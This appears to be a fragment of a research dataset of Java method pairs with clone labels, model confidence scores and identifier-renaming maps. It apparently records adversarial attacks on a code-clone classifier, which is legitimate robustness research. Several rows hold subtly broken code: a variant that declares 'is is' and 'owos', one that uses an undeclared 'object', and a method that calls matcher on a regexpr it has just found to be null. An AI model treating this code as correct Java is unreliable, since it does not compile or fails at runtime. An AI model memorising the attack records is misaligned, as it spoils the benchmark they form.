        try {
         is is = new GZIPInputStream(new FileInputStream(url));
          owos = new FileOutputStream(dominated);
            byte[] string = new byte[8192];
            for (int index; (index = is.read(string)) != -1; ) ow.write(string, 0, index);
        } catch (IOException e) {
            System.err.println(""Fehler: Kann nicht entpacken "" + args[0]);
        } finally {
            if (ow != null) try {
                ow.close();
            } catch (IOException e) {
            }
            if (is != null) try {
                is.close();
            } catch (IOException e) {
            }
        }
    }
",LABEL_1,LABEL_1,0.6702646613121033,1,"source,destination,is,os,buffer,length",,,,5,"source:url,destination:dominated,is:is,os:ow,buffer:string,length:index,",1,GA,415,0.15924878120422364,ga,[]
398,"    protected static Parser buildParser(URL url) throws IOException, ParserException {
        Parser parser;
        URLConnection connection = openConnection(url);
        if (!(connection instanceof HttpURLConnection) || ((HttpURLConnection) connection).getResponseCode() == 200) {
            parser = new Parser(connection);
        } else {
            parser = null;
        }
        return parser;
    }
 <SPLIT>     private void updateFile(File file) throws FileNotFoundException, IOException {
        File destFile = new File(file.getPath().replace(URL_UNZIPPED_PREFIX + latestVersion, """"));
        FileChannel in = null;
        FileChannel out = null;
        try {
            if (!destFile.exists()) {
                destFile.getParentFile().mkdirs();
                destFile.createNewFile();
            }
            in = new FileInputStream(file).getChannel();
            out = new FileOutputStream(destFile).getChannel();
            in.transferTo(0, in.size(), out);
        } finally {
            if (out != null) out.close();
            if (in != null) in.close();
        }
    }
",69,"    protected static Parser newWriter(URL path) throws IOException, SSLExc {
        Parser writer;
        URLConnection cobject= openConnection(path);
        if (!(object instanceof HttpURLConnection) || ((HttpURLConnection) object).getResponseCode() == 200) {
            writer = new Parser(object);
        } else {
            writer = null;
        }
        return writer;
    }
",LABEL_0,LABEL_0,0.5506023168563843,1,"buildParser,url,ParserException,parser,connection",,,,0,"buildParser:newWriter,url:path,ParserException:SSLExc,parser:writer,connection:object,",0,GA,521,0.1849411408106486,ga,[]
399,"    private void checkInputStream(InputStream in, byte[] cmp, boolean all) throws IOException {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        IOUtils.copy(in, stream);
        byte[] out = stream.toByteArray();
        if (all) assertEquals(cmp.length, out.length);
        for (int i = 0; i < cmp.length; i++) assertEquals(cmp[i], out[i]);
    }
 <SPLIT>     public void createTempFile(String resourceName) throws IOException {
        InputStream input = JulImportCallableTest.class.getResourceAsStream(resourceName);
        if (input == null) {
            fail(""Couldn't resolve resource '"" + resourceName + ""'!"");
        }
        inputFile = File.createTempFile(""Import"", ""test"");
        inputFile.delete();
        FileOutputStream output = new FileOutputStream(inputFile);
        IOUtils.copyLarge(input, output);
        IOUtilities.closeQuietly(output);
    }
",92,,LABEL_1,LABEL_1,LABEL_1,-1,"checkInputStream,in,cmp,all,stream,out,i",,,,0,,0,GA,2635,0.9257275660832723,failed,[]
400,"    private boolean copyFile(File _file1, File _file2) {
        FileInputStream fis;
        FileOutputStream fos;
        try {
            fis = new FileInputStream(_file1);
            fos = new FileOutputStream(_file2);
            FileChannel canalFuente = fis.getChannel();
            canalFuente.transferTo(0, canalFuente.size(), fos.getChannel());
            fis.close();
            fos.close();
            return true;
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
        return false;
    }
 <SPLIT>     private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
",98,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,_file1,_file2,fis,fos,canalFuente",,,,0,,0,GA,2154,0.7729966044425964,failed,[]
401,"    public static String hashStringMD5(String string) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(string.getBytes());
        byte byteData[] = md.digest();
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < byteData.length; i++) {
            sb.append(Integer.toString((byteData[i] & 0xff) + 0x100, 16).substring(1));
        }
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < byteData.length; i++) {
            String hex = Integer.toHexString(0xff & byteData[i]);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }
 <SPLIT>     private String md5(String uri) throws ConnoteaRuntimeException {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(""MD5"");
            messageDigest.update(uri.getBytes());
            byte[] bytes = messageDigest.digest();
            StringBuffer stringBuffer = new StringBuffer();
            for (byte b : bytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    stringBuffer.append('0');
                }
                stringBuffer.append(hex);
            }
            return stringBuffer.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new ConnoteaRuntimeException(e);
        }
    }
",174,,LABEL_1,LABEL_1,LABEL_1,-1,"hashStringMD5,string,md,byteData,sb,i,hexString,hex",,,,0,,0,GA,2714,0.9733097116152446,failed,[]
402,"    public static String SHA1(String text) {
        byte[] sha1hash = new byte[40];
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""iso-8859-1""), 0, text.length());
            sha1hash = md.digest();
        } catch (UnsupportedEncodingException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        }
        return convertToHex(sha1hash);
    }
 <SPLIT>         public HttpResponseExchange execute() throws Exception {
            HttpResponseExchange forwardResponse = null;
            int fetchSizeLimit = Config.getInstance().getFetchLimitSize();
            while (null != lastContentRange) {
                forwardRequest.setBody(new byte[0]);
                ContentRangeHeaderValue old = lastContentRange;
                long sendSize = fetchSizeLimit;
                if (old.getInstanceLength() - old.getLastBytePos() - 1 < fetchSizeLimit) {
                    sendSize = (old.getInstanceLength() - old.getLastBytePos() - 1);
                }
                if (sendSize <= 0) {
                    break;
                }
                lastContentRange = new ContentRangeHeaderValue(old.getLastBytePos() + 1, old.getLastBytePos() + sendSize, old.getInstanceLength());
                forwardRequest.setHeader(HttpHeaders.Names.CONTENT_RANGE, lastContentRange);
                forwardRequest.setHeader(HttpHeaders.Names.CONTENT_LENGTH, String.valueOf(sendSize));
                forwardResponse = syncFetch(forwardRequest);
                if (sendSize < fetchSizeLimit) {
                    lastContentRange = null;
                }
            }
            return forwardResponse;
        }
",135,,LABEL_0,LABEL_0,LABEL_0,-1,"SHA1,text,sha1hash,md",,,,0,,0,GA,1549,0.5546976566314697,failed,[]
403,"    @TestProperties(name = ""Simple test for adding different image files to report as link"")
    public void testAddLinkToImage() throws Exception {
        InputStream in = this.getClass().getClassLoader().getResourceAsStream(""regression/generic/images/splash.jpg"");
        report.report(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""splash.jpg"");
        IOUtils.copy(in, new FileOutputStream(new File(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""splash.jpg"")));
        in = this.getClass().getClassLoader().getResourceAsStream(""regression/generic/images/blue.png"");
        IOUtils.copy(in, new FileOutputStream(new File(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""blue.png"")));
        in = this.getClass().getClassLoader().getResourceAsStream(""regression/generic/images/classDir.gif"");
        IOUtils.copy(in, new FileOutputStream(new File(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""classDir.gif"")));
        report.addLink(""Link to JPG"", ""splash.jpg"");
        report.addLink(""Link to PNG"", ""blue.png"");
        report.addLink(""Link to GIF"", ""classDir.gif"");
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",243,,LABEL_1,LABEL_1,LABEL_1,-1,"testAddLinkToImage,in",,,,0,,0,GA,745,0.28979273239771525,failed,[]
404,"    @TestProperties(name = ""Simple test for adding different image files to report as link"")
    public void testAddLinkToImage() throws Exception {
        InputStream in = this.getClass().getClassLoader().getResourceAsStream(""regression/generic/images/splash.jpg"");
        report.report(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""splash.jpg"");
        IOUtils.copy(in, new FileOutputStream(new File(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""splash.jpg"")));
        in = this.getClass().getClassLoader().getResourceAsStream(""regression/generic/images/blue.png"");
        IOUtils.copy(in, new FileOutputStream(new File(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""blue.png"")));
        in = this.getClass().getClassLoader().getResourceAsStream(""regression/generic/images/classDir.gif"");
        IOUtils.copy(in, new FileOutputStream(new File(report.getCurrentTestFolder() + System.getProperty(""file.separator"") + ""classDir.gif"")));
        report.addLink(""Link to JPG"", ""splash.jpg"");
        report.addLink(""Link to PNG"", ""blue.png"");
        report.addLink(""Link to GIF"", ""classDir.gif"");
    }
 <SPLIT>     @Test
    public void test02_ok() throws Exception {
        DefaultHttpClient client = new DefaultHttpClient();
        try {
            HttpPost post = new HttpPost(chartURL);
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
            nameValuePairs.add(new BasicNameValuePair(""ws"", ""getDomainEvolution""));
            nameValuePairs.add(new BasicNameValuePair(""chartTitle"", ""test""));
            nameValuePairs.add(new BasicNameValuePair(""type"", ""chart""));
            nameValuePairs.add(new BasicNameValuePair(""firstDate"", ""20111124""));
            nameValuePairs.add(new BasicNameValuePair(""lastDate"", ""20111125""));
            nameValuePairs.add(new BasicNameValuePair(""wsParams"", ""type,counting,protocol,unit,proxy,domain,timeScale,period""));
            nameValuePairs.add(new BasicNameValuePair(""wsParamsValues"", ""chart,volume,all,hits,all,google.com,day,360""));
            nameValuePairs.add(new BasicNameValuePair(""serieTitle"", ""serie""));
            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse response = client.execute(post);
            HttpEntity entity = response.getEntity();
            assertNotNull(entity);
            InputStream instream = entity.getContent();
            BufferedReader reader = new BufferedReader(new InputStreamReader(instream));
            System.out.println(reader.readLine());
            instream.close();
            assertEquals(""error :"" + response.getStatusLine(), 200, response.getStatusLine().getStatusCode());
        } finally {
            client.getConnectionManager().shutdown();
        }
    }
",243,,LABEL_0,LABEL_0,LABEL_0,-1,"testAddLinkToImage,in",,,,0,,0,GA,423,0.16008553107579548,failed,[]
405,"    public static void copy(File sourceFile, File destinationFile) throws IOException {
        FileChannel sourceFileChannel = (new FileInputStream(sourceFile)).getChannel();
        FileChannel destinationFileChannel = (new FileOutputStream(destinationFile)).getChannel();
        sourceFileChannel.transferTo(0, sourceFile.length(), destinationFileChannel);
        sourceFileChannel.close();
        destinationFileChannel.close();
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",73,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,sourceFile,destinationFile,sourceFileChannel,destinationFileChannel",,,,0,,0,GA,1389,0.5275858084360758,failed,[]
406,"    public static String getContent(HttpUriRequest request) throws Exception {
        StringBuffer sb = new StringBuffer();
        HttpClient client = new DefaultHttpClient();
        HttpParams httpParams = client.getParams();
        HttpConnectionParams.setConnectionTimeout(httpParams, 30000);
        HttpConnectionParams.setSoTimeout(httpParams, 50000);
        HttpResponse response = client.execute(request);
        HttpEntity entity = response.getEntity();
        if (entity != null) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(entity.getContent(), ""UTF-8""), 8192);
            String line = null;
            while ((line = reader.readLine()) != null) {
                sb.append(line + ""\n"");
            }
            reader.close();
        }
        return sb.toString();
    }
 <SPLIT>     private void addQDInformation() {
        try {
            long qdDate = System.currentTimeMillis();
            if (_local == true) {
                File qdFile = new File(""qdinfo.dat"");
                if (!qdFile.exists()) {
                    return;
                }
                qdDate = qdFile.lastModified();
            }
            if (qdDate > this._qdFileDate) {
                this._qdFileDate = qdDate;
                for (int ii = 0; ii < this._projectInfo.size(); ii++) {
                    Information info = getInfo(ii);
                    if (info != null) {
                        info._qdValue = null;
                    }
                }
                Reader reader = null;
                if (_local == true) {
                    reader = new FileReader(""qdinfo.dat"");
                } else {
                    StringBuffer urlName = new StringBuffer();
                    urlName.append(""http://boston.quik.com/rph/"");
                    urlName.append(""qdinfo.dat"");
                    try {
                        URL url = new URL(urlName.toString());
                        InputStream stream = url.openStream();
                        reader = new InputStreamReader(stream);
                    } catch (MalformedURLException mue) {
                        mue.printStackTrace();
                    }
                }
                BufferedReader file = new BufferedReader(reader);
                try {
                    String line = null;
                    while ((line = file.readLine()) != null) {
                        if (line.startsWith(""pg "")) {
                            this._qdDate = Long.parseLong(line.substring(3), 16);
                            this._qdDate = (this._qdDate + 946684800) * 1000;
                        } else if (line.startsWith(""pt "")) {
                            line = line.substring(3).trim();
                            int pos = -1;
                            while ((line.length() > 0) && ((pos = line.indexOf(' ')) > 0)) {
                                int projectNum = 0;
                                Double value = null;
                                if (pos > 0) {
                                    projectNum = Integer.parseInt(line.substring(0, pos));
                                    line = line.substring(pos).trim();
                                }
                                pos = line.indexOf(' ');
                                if (pos > 0) {
                                    value = new Double((double) Integer.parseInt(line.substring(0, pos)) / 100);
                                    line = line.substring(pos).trim();
                                }
                                Information info = getInfo(projectNum);
                                if (info == null) {
                                    info = createInfo(projectNum);
                                }
                                if (info._qdValue == null) {
                                    info._qdValue = value;
                                }
                            }
                        }
                    }
                } finally {
                    file.close();
                }
            }
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
    }
",151,,LABEL_1,LABEL_0,,-4,"getContent,request,sb,client,httpParams,response,entity,reader,line",,,,0,,0,Greedy,1,0.0006257295608520508,,[]
407,"        protected void processAddByURLSubmit(URL url, String invalidUrlMsg) {
            if (!this.hasError()) {
                try {
                    StringWriter xmlSourceWriter = new StringWriter();
                    IOUtils.copy(url.openStream(), xmlSourceWriter);
                    processSubmittedDoap(xmlSourceWriter.toString());
                } catch (FileNotFoundException e) {
                    Session.get().error(invalidUrlMsg);
                    logger.warn(""Error processing URL: "" + invalidUrlMsg);
                } catch (IOException e) {
                    setResponsePage(new ErrorReportPage(new UserReportableException(""Unable to add doap using RDF supplied"", DoapFormPage.class, e)));
                    logger.warn(""Error processing URL: "" + url + ""; "" + e.getMessage(), e);
                }
            }
        }
 <SPLIT>     public static String CopyFile(String sourcefile, String destfile) throws FileNotFoundException, IOException {
        int last = destfile.lastIndexOf('/');
        if (last < 0) {
            DrxWriteError(""CopyFile"", ""Destination filepath "" + destfile + "" doesn't contain /"");
            throw new java.io.FileNotFoundException(destfile);
        }
        String parent = destfile.substring(0, last);
        if (parent.length() > 0) {
            File f = new File(parent);
            if (!f.isDirectory()) {
                if (!f.mkdirs()) {
                    DrxWriteError(""CopyFile"", ""Folder "" + parent + "" doesn't exist, cannot create"");
                }
            }
        }
        FileChannel srcChannel = new FileInputStream(sourcefile).getChannel();
        FileChannel dstChannel = new FileOutputStream(destfile).getChannel();
        dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        srcChannel.close();
        dstChannel.close();
        return destfile;
    }
",137,"        protected void processAddByURLSubmit(URL url, String invalidUrlMsg) {
            if (!this.hasError()) {
                try {
                    StringWriter xmlSourceWriter = new StringWriter();
                    IOUtils.copy(url.openStream(), xmlSourceWriter);
                    processSubmittedDoap(xmlSourceWriter.toString());
                } catch (FileNotFoundException e) {
                    Session.get().error(invalidUrlMsg);
                    logger.warn(""Error processing URL: "" + invalidUrlMsg);
                } catch (IOException e) {
                    setResponsePage(new ErrorReportPage(new UserReportableException(""Unable to add doap using RDF supplied"", DoapFormPage.class, e)));
                    logger.warn(""Error processing URL: "" + url + ""; "" + e.getMessage(), e);
                }
            }
        }
",LABEL_1,LABEL_1,0.9039558172225952,1,"processAddByURLSubmit,url,invalidUrlMsg,xmlSourceWriter",,,,10,"processAddByURLSubmit:processAddByURLSubmit,url:url,invalidUrlMsg:invalidUrlMsg,xmlSourceWriter:xmlSourceWriter,",4,GA,231,0.0835647463798523,ga,[]
408,"    public static void copyFile(File from, File to) throws IOException {
        assert (from != null);
        assert (to != null);
        if (!to.exists()) {
            File parentDir = to.getParentFile();
            if (!parentDir.exists()) parentDir.mkdirs();
            to.createNewFile();
        }
        FileInputStream in = null;
        FileOutputStream out = null;
        try {
            in = new FileInputStream(from);
            try {
                out = new FileOutputStream(to);
                FileChannel ic = in.getChannel();
                try {
                    FileChannel oc = out.getChannel();
                    try {
                        oc.transferFrom(ic, 0, from.length());
                    } finally {
                        if (oc != null) {
                            oc.close();
                        }
                    }
                } finally {
                    if (ic != null) {
                        ic.close();
                    }
                }
            } finally {
                if (out != null) {
                    out.close();
                }
            }
        } finally {
            if (in != null) {
                in.close();
            }
        }
    }
 <SPLIT>     public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",210,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,from,to,parentDir,in,out,ic,oc",,,,0,,0,GA,2743,0.9915643533070883,failed,[]
409,"    public String readPage(boolean ignoreComments) throws Exception {
        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
        String inputLine;
        String html = """";
        if (ignoreComments) {
            while ((inputLine = in.readLine()) != null) {
                if (inputLine.length() > 0) {
                    if (inputLine.substring(0, 1).compareTo(""#"") != 0) {
                        html = html + inputLine + ""\n"";
                    }
                }
            }
        } else {
            while ((inputLine = in.readLine()) != null) {
                html = html + inputLine + ""\n"";
            }
        }
        in.close();
        return html;
    }
 <SPLIT>     protected InputStream callApiPost(String apiUrl, Map<String, List<String>> parameters, int expected) {
        try {
            URL url = new URL(apiUrl);
            HttpURLConnection request = (HttpURLConnection) url.openConnection();
            if (ApplicationConstants.CONNECT_TIMEOUT > -1) {
                request.setConnectTimeout(ApplicationConstants.CONNECT_TIMEOUT);
            }
            if (ApplicationConstants.READ_TIMEOUT > -1) {
                request.setReadTimeout(ApplicationConstants.READ_TIMEOUT);
            }
            for (String headerName : requestHeaders.keySet()) {
                request.setRequestProperty(headerName, requestHeaders.get(headerName));
            }
            request.setRequestMethod(""POST"");
            request.setDoOutput(true);
            PrintStream out = new PrintStream(new BufferedOutputStream(request.getOutputStream()));
            out.print(getParametersString(parameters));
            out.flush();
            out.close();
            request.connect();
            if (request.getResponseCode() != expected) {
                throw new BingMapsException(convertStreamToString(request.getErrorStream()));
            } else {
                return getWrappedInputStream(request.getInputStream(), GZIP_ENCODING.equalsIgnoreCase(request.getContentEncoding()));
            }
        } catch (IOException e) {
            throw new BingMapsException(e);
        }
    }
",142,,LABEL_1,LABEL_0,,-4,"readPage,ignoreComments,in,inputLine,html",,,,0,,0,Greedy,1,0.000556027889251709,,[]
410,"    protected void innerProcess(ProcessorURI curi) throws InterruptedException {
        Pattern regexpr = curi.get(this, STRIP_REG_EXPR);
        ReplayCharSequence cs = null;
        try {
            cs = curi.getRecorder().getReplayCharSequence();
        } catch (Exception e) {
            curi.getNonFatalFailures().add(e);
            logger.warning(""Failed get of replay char sequence "" + curi.toString() + "" "" + e.getMessage() + "" "" + Thread.currentThread().getName());
            return;
        }
        MessageDigest digest = null;
        try {
            try {
                digest = MessageDigest.getInstance(SHA1);
            } catch (NoSuchAlgorithmException e1) {
                e1.printStackTrace();
                return;
            }
            digest.reset();
            String s = null;
            if (regexpr != null) {
                s = cs.toString();
            } else {
                Matcher m = regexpr.matcher(cs);
                s = m.replaceAll("" "");
            }
            digest.update(s.getBytes());
            byte[] newDigestValue = digest.digest();
            curi.setContentDigest(SHA1, newDigestValue);
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (IOException ioe) {
                    logger.warning(TextUtils.exceptionToString(""Failed close of ReplayCharSequence."", ioe));
                }
            }
        }
    }
 <SPLIT>     public PTask stop(PTask task, SyrupConnection con) throws Exception {
        PreparedStatement s = null;
        ResultSet result = null;
        try {
            s = con.prepareStatementFromCache(sqlImpl().sqlStatements().checkWorkerStatement());
            s.setString(1, task.key());
            result = s.executeQuery();
            con.commit();
            if (result.next()) {
                String url = result.getString(""worker"");
                InputStream i = null;
                try {
                    Object b = new URL(url).getContent();
                    if (b instanceof InputStream) {
                        i = (InputStream) b;
                        byte[] bb = new byte[256];
                        int ll = i.read(bb);
                        String k = new String(bb, 0, ll);
                        if (k.equals(task.key())) {
                            return task;
                        }
                    }
                } catch (Exception e) {
                } finally {
                    if (i != null) {
                        i.close();
                    }
                }
                PreparedStatement s2 = null;
                s2 = con.prepareStatementFromCache(sqlImpl().sqlStatements().resetWorkerStatement());
                s2.setString(1, task.key());
                s2.executeUpdate();
                task = sqlImpl().queryFunctions().readPTask(task.key(), con);
                sqlImpl().loggingFunctions().log(task.key(), LogEntry.STOPPED, con);
                con.commit();
            }
        } finally {
            con.rollback();
            close(result);
        }
        return task;
    }
",264,,LABEL_0,LABEL_0,LABEL_0,-1,"innerProcess,curi,regexpr,cs,digest,s,m,newDigestValue",,,,0,,0,GA,3001,1.1046624024709066,failed,[]
411,"    public boolean connect() {
        boolean isConnected = false;
        try {
            try {
                this.ftpClient.connect(this.server, this.port);
            } catch (SocketException e) {
                status = ErrorResult.CONNECTNOTPOSSIBLE.code;
                return false;
            } catch (IOException e) {
                status = ErrorResult.CONNECTNOTPOSSIBLE.code;
                return false;
            }
            int reply = this.ftpClient.getReplyCode();
            if (!FTPReply.isPositiveCompletion(reply)) {
                this.disconnect();
                status = ErrorResult.CONNECTNOTCORRECT.code;
                return false;
            }
            try {
                if (this.account == null) {
                    if (!this.ftpClient.login(this.username, this.passwd)) {
                        status = ErrorResult.LOGINNOTCORRECT.code;
                        this.ftpClient.logout();
                        return false;
                    }
                } else if (!this.ftpClient.login(this.username, this.passwd, this.account)) {
                    status = ErrorResult.LOGINACCTNOTCORRECT.code;
                    this.ftpClient.logout();
                    return false;
                }
            } catch (IOException e) {
                status = ErrorResult.ERRORWHILECONNECT.code;
                try {
                    this.ftpClient.logout();
                } catch (IOException e1) {
                }
                return false;
            }
            isConnected = true;
            return true;
        } finally {
            if ((!isConnected) && this.ftpClient.isConnected()) {
                this.disconnect();
            }
        }
    }
 <SPLIT>     public byte[] getDigest(OMAttribute attribute, String digestAlgorithm) throws OMException {
        byte[] digest = new byte[0];
        if (!(attribute.getLocalName().equals(""xmlns"") || attribute.getLocalName().startsWith(""xmlns:""))) try {
            MessageDigest md = MessageDigest.getInstance(digestAlgorithm);
            md.update((byte) 0);
            md.update((byte) 0);
            md.update((byte) 0);
            md.update((byte) 2);
            md.update(getExpandedName(attribute).getBytes(""UnicodeBigUnmarked""));
            md.update((byte) 0);
